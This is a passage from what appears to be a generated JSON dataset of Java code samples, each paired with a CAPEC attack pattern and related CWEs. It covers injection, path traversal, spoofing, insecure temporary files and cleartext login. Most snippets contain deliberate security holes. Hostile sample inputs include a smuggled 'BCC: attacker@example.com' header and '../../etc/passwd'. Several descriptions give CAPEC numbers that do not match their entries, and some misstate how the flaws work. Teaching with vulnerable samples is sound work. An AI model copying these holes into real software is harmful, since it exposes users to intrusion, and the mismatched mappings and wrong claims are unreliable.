        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailInjectionExample {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String subject = \"Test Email\";\n        String body = \"Hello, this is a test email.\";\n        String maliciousInput = \"\\nBCC: attacker@example.com\";\n\n        sendEmail(to, subject, body + maliciousInput);\n    }\n\n    public static void sendEmail(String to, String subject, String body) {\n        String from = \"sender@example.com\";\n        String host = \"localhost\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(subject);\n            message.setText(body);\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an email injection vulnerability. The `sendEmail` function constructs an email message using input parameters for the recipient, subject, and body. The `main` method appends a malicious input string (`\\nBCC: attacker@example.com`) to the email body, which could manipulate the email headers to include a BCC recipient without the original sender's intention. This example embodies the CAPEC of Email Injection by showing how delimiter characters (newline in this case) can be used to inject additional headers. The related CWEs are represented by the improper neutralization of special elements (CWE-150, CWE-147), improper encoding or escaping of output (CWE-116), and improper neutralization of CRLF sequences (CWE-113)."
    },
    {
        "capec_id": "135",
        "capec_name": "Format String Injection",
        "code_snippet": "import java.util.Scanner;\n\npublic class FormatStringVulnerability {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String userInput = scanner.nextLine();\n        \n        // Vulnerable code: using user input directly in printf\n        System.out.printf(userInput);\n    }\n}",
        "description": "This Java code snippet demonstrates a format string injection vulnerability. The program prompts the user to enter their name and then directly uses the user input in the printf function. This is dangerous because if the user input contains format specifiers (e.g., %s, %n), it can lead to unexpected behavior, such as reading or writing to memory locations. This vulnerability is related to CWE-134 (Use of Externally-Controlled Format String) as the format string originates from an external source (user input). It also touches on CWE-20 (Improper Input Validation) and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component) because the input is not validated or sanitized before being used in the printf function."
    },
    {
        "capec_id": "136",
        "capec_name": "LDAP Injection",
        "code_snippet": "import javax.naming.Context;\nimport javax.naming.InitialContext;\nimport javax.naming.NamingException;\nimport javax.naming.directory.DirContext;\nimport javax.naming.directory.InitialDirContext;\nimport javax.naming.directory.SearchControls;\nimport javax.naming.directory.SearchResult;\nimport javax.naming.directory.Attributes;\nimport java.util.Hashtable;\n\npublic class LDAPInjectionExample {\n    public static void main(String[] args) {\n        String userInput = \"*\"; // Simulating user input that could be malicious\n        String ldapSearchBase = \"ou=users,dc=example,dc=com\";\n        String ldapSearchFilter = \"(uid=\" + userInput + \")\";\n\n        Hashtable<String, String> env = new Hashtable<String, String>();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL, \"ldap://localhost:389\");\n\n        try {\n            DirContext ctx = new InitialDirContext(env);\n            SearchControls searchControls = new SearchControls();\n            searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);\n            javax.naming.NamingEnumeration<SearchResult> results = ctx.search(ldapSearchBase, ldapSearchFilter, searchControls);\n\n            while (results.hasMore()) {\n                SearchResult searchResult = results.next();\n                Attributes attributes = searchResult.getAttributes();\n                System.out.println(attributes);\n            }\n        } catch (NamingException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a potential LDAP Injection vulnerability. The code constructs an LDAP query using user input without proper validation or neutralization of special characters. The user input is directly concatenated into the LDAP search filter, which can be exploited by an attacker to manipulate the query. For example, if the user input is '*', it could return information about all users in the LDAP directory. This example highlights the importance of proper input validation and neutralization to prevent LDAP Injection attacks, as described in CAPEC-90 and related CWEs."
    },
    {
        "capec_id": "137",
        "capec_name": "Parameter Injection",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerableServlet\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userInput = request.getParameter(\"input\");\n        String query = \"SELECT * FROM users WHERE username='\" + userInput + \"'\";\n        // Simulate query execution\n        System.out.println(\"Executing query: \" + query);\n        response.getWriter().write(\"Query executed: \" + query);\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to 'Parameter Injection' (CAPEC-137). The servlet takes a user input from an HTTP GET request parameter named 'input' and directly incorporates it into an SQL query string without proper validation or encoding. This can allow an attacker to manipulate the query by injecting special characters or additional parameters. For example, if the user input is 'admin'&new_param=myValue', the query becomes 'SELECT * FROM users WHERE username='admin'&new_param=myValue'', which can alter the intended logic of the query. This code snippet also touches on related CWEs such as CWE-88 (Improper Neutralization of Argument Delimiters in a Command) and CWE-598 (Use of GET Request Method With Sensitive Query Strings), highlighting the risks of improper input handling and the use of GET requests for sensitive data."
    },
    {
        "capec_id": "138",
        "capec_name": "Reflection Injection",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class ReflectionInjectionExample {\n    public static void main(String[] args) {\n        if (args.length != 2) {\n            System.out.println(\"Usage: java ReflectionInjectionExample <className> <methodName>\");\n            return;\n        }\n\n        String className = args[0];\n        String methodName = args[1];\n\n        try {\n            // Load the class dynamically based on user input\n            Class<?> cls = Class.forName(className);\n            // Get the method dynamically based on user input\n            Method method = cls.getMethod(methodName);\n            // Invoke the method (assuming it is static and takes no parameters)\n            method.invoke(null);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n// Example of a class that could be loaded\nclass SafeClass {\n    public static void safeMethod() {\n        System.out.println(\"Safe method executed.\");\n    }\n}\n\n// Example of a malicious class that could be loaded\nclass MaliciousClass {\n    public static void maliciousMethod() {\n        System.out.println(\"Malicious method executed.\");\n        // Potentially harmful actions here\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection injection vulnerability. The program takes two command-line arguments: a class name and a method name. It then uses Java reflection to dynamically load the specified class and invoke the specified method. If an attacker can control the input, they could potentially load and execute malicious code. For example, an attacker could specify 'MaliciousClass' and 'maliciousMethod' to execute harmful actions. This code embodies the main idea of CAPEC-470 (Unsafe Reflection) and is related to other CWEs like command injection and code injection, as it allows external input to control the behavior of the application without proper validation or neutralization."
    },
    {
        "capec_id": "139",
        "capec_name": "Relative Path Traversal",
        "code_snippet": "import java.io.*;\n\npublic class PathTraversalExample {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java PathTraversalExample <filename>\");\n            return;\n        }\n\n        String filename = args[0];\n        String basePath = \"/var/www/html/\";\n        File file = new File(basePath + filename);\n\n        try {\n            BufferedReader reader = new BufferedReader(new FileReader(file));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            reader.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a relative path traversal vulnerability. The program takes a filename as a command-line argument and constructs a file path by concatenating a base directory path (`/var/www/html/`) with the provided filename. It then attempts to read and print the contents of the file. The vulnerability arises because the input filename is not properly validated or sanitized, allowing an attacker to supply a path like `../../etc/passwd` to access sensitive files outside the intended directory. This example embodies the main idea of CAPEC-126 (Relative Path Traversal) and related CWEs, highlighting the risk of improper input validation and the potential for unauthorized file access."
    },
    {
        "capec_id": "140",
        "capec_name": "Bypassing of Intermediate Forms in Multiple-Form Sets",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class MultiFormServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession();\n        String currentForm = request.getParameter(\"form\");\n        String expectedForm = (String) session.getAttribute(\"expectedForm\");\n\n        if (expectedForm == null || !expectedForm.equals(currentForm)) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Invalid form sequence\");\n            return;\n        }\n\n        // Process the form data\n        // ...\n\n        // Update the expected form for the next step\n        session.setAttribute(\"expectedForm\", getNextForm(currentForm));\n    }\n\n    private String getNextForm(String currentForm) {\n        switch (currentForm) {\n            case \"form1\": return \"form2\";\n            case \"form2\": return \"form3\";\n            // Add more forms as needed\n            default: return null;\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a multi-form web application where users are required to submit information through an ordered sequence of forms. The code uses HTTP sessions to track the expected form sequence. When a form is submitted, the servlet checks if the submitted form matches the expected form stored in the session. If the forms do not match, an error is returned, preventing the user from bypassing intermediate forms. This approach addresses the CAPEC 'Bypassing of Intermediate Forms in Multiple-Form Sets' by ensuring that users cannot skip forms. The code also touches on related CWEs: CWE-372 (Incomplete Internal State Distinction) by maintaining the correct form sequence state, CWE-472 (External Control of Assumed-Immutable Web Parameter) by validating the form parameter, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) by ensuring the form sequence is controlled and validated."
    },
    {
        "capec_id": "141",
        "capec_name": "Cache Poisoning",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class CachePoisoningExample {\n    private static Map<String, String> cache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate fetching data from a less trusted source\n        String data = fetchDataFromUntrustedSource(\"key1\");\n        cache.put(\"key1\", data);\n\n        // Simulate fetching data from a trusted source\n        String trustedData = fetchDataFromTrustedSource(\"key1\");\n        cache.put(\"key1\", trustedData);\n\n        // Accessing the cache\n        String cachedData = cache.get(\"key1\");\n        System.out.println(\"Cached Data: \" + cachedData);\n    }\n\n    private static String fetchDataFromUntrustedSource(String key) {\n        // Simulate untrusted data\n        return \"untrusted_data\";\n    }\n\n    private static String fetchDataFromTrustedSource(String key) {\n        // Simulate trusted data\n        return \"trusted_data\";\n    }\n}",
        "description": "This Java code snippet demonstrates a simple cache poisoning scenario. The cache is a HashMap that stores data fetched from both trusted and untrusted sources. Initially, data from an untrusted source is placed into the cache. Later, data from a trusted source is also placed into the cache using the same key. When accessing the cache, the data from the trusted source overwrites the untrusted data. However, if the untrusted data is fetched last or if there is no proper validation, the cache could end up containing harmful or incorrect data. This example highlights the risks associated with using less trusted sources (CWE-348), insufficient verification of data authenticity (CWE-345), and acceptance of extraneous untrusted data with trusted data (CWE-349)."
    },
    {
        "capec_id": "142",
        "capec_name": "DNS Cache Poisoning",
        "code_snippet": "import java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class DNSCachePoisoningExample {\n    private static Map<String, String> dnsCache = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding a trusted DNS entry\n        dnsCache.put(\"www.example.com\", \"93.184.216.34\");\n\n        // Simulate an attacker poisoning the DNS cache\n        dnsCache.put(\"www.example.com\", \"192.168.1.100\");\n\n        // Client trying to resolve the domain name\n        String ipAddress = resolveDomain(\"www.example.com\");\n        System.out.println(\"Resolved IP Address: \" + ipAddress);\n    }\n\n    public static String resolveDomain(String domain) {\n        // Insufficient verification of data authenticity (CWE-345)\n        if (dnsCache.containsKey(domain)) {\n            return dnsCache.get(domain);\n        } else {\n            try {\n                InetAddress inetAddress = InetAddress.getByName(domain);\n                return inetAddress.getHostAddress();\n            } catch (UnknownHostException e) {\n                e.printStackTrace();\n                return null;\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of DNS cache poisoning. The `dnsCache` map simulates a DNS cache where domain names are mapped to IP addresses. Initially, a trusted DNS entry is added to the cache. However, an attacker can poison the cache by inserting a malicious IP address for the same domain name. When a client tries to resolve the domain name, it retrieves the poisoned IP address from the cache due to insufficient verification of data authenticity (CWE-345). This example highlights the vulnerability where the DNS cache can be manipulated, leading to incorrect domain name resolution and potential security risks."
    },
    {
        "capec_id": "143",
        "capec_name": "Detect Unpublicized Web Pages",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class SensitiveFileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = getServletContext().getRealPath(\"/sensitive-data/config.txt\");\n        File file = new File(filePath);\n        if (file.exists()) {\n            response.setContentType(\"text/plain\");\n            try (BufferedReader br = new BufferedReader(new FileReader(file))) {\n                String line;\n                while ((line = br.readLine()) != null) {\n                    response.getWriter().println(line);\n                }\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND);\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability where sensitive data is stored under the web root and can be accessed without proper authorization. The servlet serves a file located at '/sensitive-data/config.txt' directly to the client if it exists. This embodies the CAPEC idea of 'Detect Unpublicized Web Pages' by allowing an adversary to access sensitive information that was not intended to be publicized. The code also touches on related CWEs such as 'Direct Request (Forced Browsing)' (CWE-425) and 'Storage of File with Sensitive Data Under Web Root' (CWE-219)."
    },
    {
        "capec_id": "144",
        "capec_name": "Detect Unpublicized Web Services",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/unpublishedService\")\npublic class UnpublishedService extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // No authentication or authorization checks\n        response.getWriter().println(\"Sensitive data exposed\");\n    }\n}\n",
        "description": "This Java code snippet defines a servlet named 'UnpublishedService' that is mapped to the URL '/unpublishedService'. The servlet's doGet method handles HTTP GET requests and responds with a message 'Sensitive data exposed'. The code lacks authentication and authorization checks, making it vulnerable to unauthorized access. This represents the CAPEC 'Detect Unpublicized Web Services' by demonstrating how an unpublished web service can be accessed without proper security controls. The related CWEs are illustrated by the absence of access control (CWE-425), potential exposure of sensitive information (CWE-651), and omission of security-relevant information (CWE-223)."
    },
    {
        "capec_id": "145",
        "capec_name": "Checksum Spoofing",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class ChecksumSpoofingExample {\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String message = \"Sensitive data\";\n        String checksum = generateChecksum(message);\n\n        // Simulate message modification by an adversary\n        String modifiedMessage = \"Tampered data\";\n        String spoofedChecksum = generateChecksum(modifiedMessage);\n\n        // Receiver verifies the message\n        if (verifyChecksum(modifiedMessage, spoofedChecksum)) {\n            System.out.println(\"Message integrity verified.\");\n        } else {\n            System.out.println(\"Message integrity compromised.\");\n        }\n    }\n\n    public static String generateChecksum(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] digest = md.digest(data.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : digest) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n\n    public static boolean verifyChecksum(String data, String checksum) throws NoSuchAlgorithmException {\n        String newChecksum = generateChecksum(data);\n        return newChecksum.equals(checksum); // CWE-354: Improper Validation of Integrity Check Value\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of checksum spoofing. The `generateChecksum` method uses the MD5 hashing algorithm (CWE-328: Use of Weak Hash) to create a checksum for a given message. The `verifyChecksum` method checks if the checksum of the received message matches the provided checksum (CWE-354: Improper Validation of Integrity Check Value). In the main method, an adversary modifies the message and generates a new checksum for the tampered message. The receiver then verifies the integrity of the modified message using the spoofed checksum, which falsely indicates that the message integrity is intact. This example highlights the vulnerability of using weak hash functions and improper validation of checksums, which can be exploited for checksum spoofing attacks."
    },
    {
        "capec_id": "146",
        "capec_name": "XML Schema Poisoning",
        "code_snippet": "import javax.xml.XMLConstants;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.transform.dom.DOMSource;\nimport javax.xml.validation.Schema;\nimport javax.xml.validation.SchemaFactory;\nimport javax.xml.validation.Validator;\nimport org.w3c.dom.Document;\nimport java.io.File;\nimport java.io.StringReader;\nimport javax.xml.transform.stream.StreamSource;\n\npublic class XMLSchemaPoisoningExample {\n    public static void main(String[] args) {\n        try {\n            // Load XML file\n            File xmlFile = new File(\"data.xml\");\n\n            // Load XML schema from an external source (vulnerable)\n            String schemaPath = \"http://example.com/schema.xsd\";\n            SchemaFactory schemaFactory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\n            Schema schema = schemaFactory.newSchema(new StreamSource(schemaPath));\n\n            // Parse XML file\n            DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();\n            dbFactory.setNamespaceAware(true);\n            DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();\n            Document doc = dBuilder.parse(xmlFile);\n\n            // Validate XML against the schema\n            Validator validator = schema.newValidator();\n            validator.validate(new DOMSource(doc));\n\n            System.out.println(\"XML is valid.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to XML Schema Poisoning. The code loads an XML schema from an external source (http://example.com/schema.xsd) and uses it to validate an XML file (data.xml). This approach is vulnerable because an attacker could potentially modify the schema at the external source, leading to schema poisoning. The attacker could then manipulate the schema to compromise the security of the application processing the XML. This example embodies CWE-15 (External Control of System or Configuration Setting) and CWE-112 (Missing XML Validation) by showing how external control over the schema can lead to security issues."
    },
    {
        "capec_id": "147",
        "capec_name": "XML Ping of the Death",
        "code_snippet": "import java.io.StringReader;\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.xml.sax.InputSource;\n\npublic class XMLPingOfDeath {\n    public static void main(String[] args) {\n        String xmlMessage = \"<message>\" + \"<data>\" + \"A\".repeat(1000) + \"</data>\" + \"</message>\";\n        for (int i = 0; i < 100000; i++) {\n            processXML(xmlMessage);\n        }\n    }\n\n    public static void processXML(String xml) {\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(xml)));\n            // Simulate processing of the XML document\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an XML Ping of the Death attack. The main idea is to flood the target system with a large number of small XML messages, causing resource depletion. The `main` method generates a repetitive XML message and sends it in a loop, simulating a high rate of incoming messages. The `processXML` method parses the XML message without any validation or throttling, leading to uncontrolled resource consumption (CWE-400) and allocation of resources without limits (CWE-770). The lack of XML schema validation (CWE-112) further exacerbates the issue, making the system vulnerable to this type of attack."
    },
    {
        "capec_id": "148",
        "capec_name": "Content Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Vulnerable to content spoofing\n            String modifiedContent = content.toString().replace(\"Original Content\", \"Spoofed Content\");\n            System.out.println(modifiedContent);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing. The program fetches content from a specified URL (http://example.com) and reads the content line by line. It then modifies the content by replacing 'Original Content' with 'Spoofed Content' before printing it out. This represents the CAPEC concept of content spoofing, where an adversary modifies the content to display something other than what the original content producer intended. The code is vulnerable to CWE-345 (Insufficient Verification of Data Authenticity) as it does not verify the authenticity of the fetched data, CWE-924 (Improper Enforcement of Message Integrity During Transmission) as it does not ensure the message was not modified during transmission, and CWE-433 (Unparsed Raw Web Content Delivery) as it processes raw content without proper handling."
    },
    {
        "capec_id": "149",
        "capec_name": "Explore for Predictable Temporary File Names",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFile {\n    public static void main(String[] args) {\n        try {\n            // Predictable temporary file name\n            String tempFileName = \"tempfile_\" + System.currentTimeMillis() + \".txt\";\n            File tempFile = new File(\"/tmp/\" + tempFileName);\n\n            // Create the temporary file with insecure permissions\n            if (tempFile.createNewFile()) {\n                System.out.println(\"Temporary file created: \" + tempFile.getAbsolutePath());\n\n                // Set insecure permissions (world-readable and writable)\n                Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n                Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation of a temporary file with a predictable name in a directory with insecure permissions. The file is created in the '/tmp/' directory with a name based on the current timestamp, making it predictable. Additionally, the file is assigned world-readable and writable permissions, making it insecure. This example embodies the CAPEC 'Explore for Predictable Temporary File Names' by showing how an attacker could predict the file name and exploit the insecure permissions to access or manipulate the file. The related CWEs are represented by the insecure creation and permission settings of the temporary file."
    },
    {
        "capec_id": "150",
        "capec_name": "Collect Data from Common Resource Locations",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SensitiveDataExposure {\n    public static void main(String[] args) {\n        // Path to a common resource location\n        String filePath = \"/etc/config.txt\";\n        File file = new File(filePath);\n        \n        if (file.exists() && file.canRead()) {\n            try (FileInputStream fis = new FileInputStream(file)) {\n                byte[] data = new byte[(int) file.length()];\n                fis.read(data);\n                String content = new String(data);\n                System.out.println(\"File content: \" + content);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist or cannot be read.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Collect Data from Common Resource Locations' (CAPEC-168). The code attempts to read a configuration file located in a common directory (/etc/config.txt) on a Unix system. If the file exists and is readable, it reads the file's content and prints it to the console. This example highlights the vulnerability where sensitive files are stored in predictable locations and are accessible to unauthorized actors (CWE-552). The code does not implement any security measures to protect the sensitive data, making it susceptible to exposure."
    },
    {
        "capec_id": "151",
        "capec_name": "Identity Spoofing",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class IdentitySpoofingExample {\n    private static Map<String, String> userDatabase = new HashMap<>();\n\n    static {\n        // Pre-populated user database with username and password\n        userDatabase.put(\"user1\", \"password1\");\n        userDatabase.put(\"user2\", \"password2\");\n    }\n\n    public static boolean authenticate(String username, String password) {\n        // Weak authentication: only checks if the username exists\n        if (userDatabase.containsKey(username)) {\n            return true;\n        }\n        return false;\n    }\n\n    public static void main(String[] args) {\n        String username = \"user1\";\n        String password = \"wrongpassword\";\n\n        if (authenticate(username, password)) {\n            System.out.println(\"Authentication successful for user: \" + username);\n        } else {\n            System.out.println(\"Authentication failed for user: \" + username);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a weak authentication mechanism that is vulnerable to identity spoofing. The `authenticate` method only checks if the username exists in the user database, without verifying the password. This represents CWE-287 (Improper Authentication) and CWE-1390 (Weak Authentication), as the system does not sufficiently prove the claimed identity. An attacker can easily spoof the identity by providing any password, as long as the username exists in the database. This code embodies the main idea of CAPEC-151 (Identity Spoofing) by showing how an adversary can assume another user's identity due to improper authentication checks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "import java.util.Scanner;\n\npublic class InputValidationExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your age: \");\n        String input = scanner.nextLine();\n        int age = Integer.parseInt(input); // CWE-1287: Improper Validation of Specified Type of Input\n        if (age >= 18) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a common vulnerability related to improper input validation (CAPEC-20). The program prompts the user to enter their age and then attempts to parse the input directly to an integer without validating if the input is indeed a valid integer (CWE-1287). This can lead to a NumberFormatException if the input is not a valid integer, potentially causing the program to crash or behave unexpectedly. Additionally, the code relies on the input to make a security decision (CWE-807), granting or denying access based on the age provided by the user. An attacker could exploit this by providing non-numeric input or manipulating the input to bypass the security check."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "import java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class ResourceLocationSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // Vulnerable URL - does not verify the source\n            String urlString = \"http://trusted.example.com/resource\";\n            URL url = new URL(urlString);\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Read the response\n            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Print the content\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of resource location spoofing. The code attempts to fetch a resource from a URL without verifying the source or destination. This can be exploited by an attacker to redirect the request to a malicious resource. The code does not check if the URL has been tampered with or if the response is from a trusted source, embodying the main idea of CAPEC-111 (Resource Location Spoofing). The related CWEs are represented as follows: CWE-451 (UI Misrepresentation) is implied by the lack of user feedback on the actual source, CWE-941 (Incorrectly Specified Destination) is shown by the hardcoded URL, CWE-290 (Authentication Bypass by Spoofing) is implied by the lack of authentication, CWE-940 (Improper Verification of Source) is shown by not verifying the response source, and CWE-923 (Improper Restriction of Communication Channel) is represented by the lack of endpoint verification."
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class InsecureTempFileExample {\n    public static void main(String[] args) {\n        try {\n            // Create a temporary file in the system's default temp directory\n            File tempFile = File.createTempFile(\"tempData\", \".txt\");\n\n            // Write sensitive information to the temporary file\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(\"Sensitive Information: User Password = 'password123'\");\n            writer.close();\n\n            // Set insecure permissions (readable by others)\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rw-r--r--\");\n            Files.setPosixFilePermissions(Paths.get(tempFile.getAbsolutePath()), perms);\n\n            System.out.println(\"Temporary file created at: \" + tempFile.getAbsolutePath());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the creation and use of an insecure temporary file, embodying the main idea of the CAPEC 'Screen Temporary Files for Sensitive Information'. The code creates a temporary file, writes sensitive information to it, and sets insecure permissions (readable by others). This example highlights several related CWEs: CWE-377 (Insecure Temporary File), CWE-524 (Use of Cache Containing Sensitive Information), CWE-379 (Creation of Temporary File in Directory with Insecure Permissions), and CWE-378 (Creation of Temporary File With Insecure Permissions). The code illustrates how sensitive information can be exposed through improper handling of temporary files."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.Socket;\n\npublic class SniffingAttackExample {\n    public static void main(String[] args) {\n        String serverAddress = \"example.com\";\n        int port = 80;\n        try (Socket socket = new Socket(serverAddress, port);\n             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n             OutputStreamWriter writer = new OutputStreamWriter(socket.getOutputStream())) {\n\n            // Sending sensitive data in cleartext (CWE-319)\n            String sensitiveData = \"username=admin&password=12345\";\n            writer.write(\"POST /login HTTP/1.1\\r\\n\");\n            writer.write(\"Host: \" + serverAddress + \"\\r\\n\");\n            writer.write(\"Content-Length: \" + sensitiveData.length() + \"\\r\\n\");\n            writer.write(\"Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n\");\n            writer.write(sensitiveData);\n            writer.flush();\n\n            // Reading response (potentially sniffed by an attacker)\n            String responseLine;\n            while ((responseLine = reader.readLine()) != null) {\n                System.out.println(responseLine);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic client-server communication where sensitive data (username and password) is transmitted in cleartext over an HTTP connection. The code connects to a server, sends a POST request with sensitive data, and reads the server's response. This example embodies the main idea of a Sniffing Attack (CAPEC-158) by showing how an attacker could intercept sensitive information transmitted in cleartext (CWE-319). The lack of encryption and message integrity checks makes the communication vulnerable to interception and potential modification by unauthorized actors."
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
